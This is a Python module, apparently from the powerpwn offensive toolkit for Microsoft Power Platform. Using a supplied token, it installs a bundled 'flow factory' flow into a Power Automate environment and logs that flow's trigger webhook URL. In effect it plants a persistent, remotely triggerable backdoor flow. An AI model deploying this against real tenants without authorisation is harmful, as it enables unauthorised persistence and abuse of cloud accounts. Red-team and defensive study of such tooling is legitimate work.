import json
import logging
import os
import pathlib

from powerpwn.const import LOGGER_NAME
from powerpwn.powerdump.utils.requests_wrapper import init_session

logger = logging.getLogger(LOGGER_NAME)


class FlowFlowInstaller:
    def __init__(self, token: str):
        self.__session = init_session(token=token)

    def install(self, environment_id: str, connection_id: str) -> None:
        path = os.path.join(pathlib.Path(__file__).parent.resolve(), "samples", "flow_factory_to_install.json")
        with open(path) as f:
            flow_definition = json.load(f)
            flow_definition["properties"]["connectionReferences"]["shared_flowmanagement"]["connectionName"] = connection_id

            result = self.__session.post(
                f"https://emea.api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/{environment_id}/flows?api-version=2016-11-01",
                json=flow_definition,
            )
            if result.status_code == 201:
                res_json = json.loads(result.text)
                logger.info(f'Flow installed successfully. Flow id{res_json["id"]}')
                logger.info("Getting flow webhook url...")
                flow_name = res_json["name"]
                result = self.__session.post(
                    f"https://emea.api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/{environment_id}/flows/{flow_name}/triggers/manual/listCallbackUrl?api-version=2016-11-01"
                )
                if result.status_code == 200:
                    webhook_url = json.loads(result.text)["response"]["value"]
                    logger.info(f"Webhook url is: {webhook_url}")
            else:
                logger.warning(f"Something wen wrong. status code: {result.status_code}, text: {result.text}")
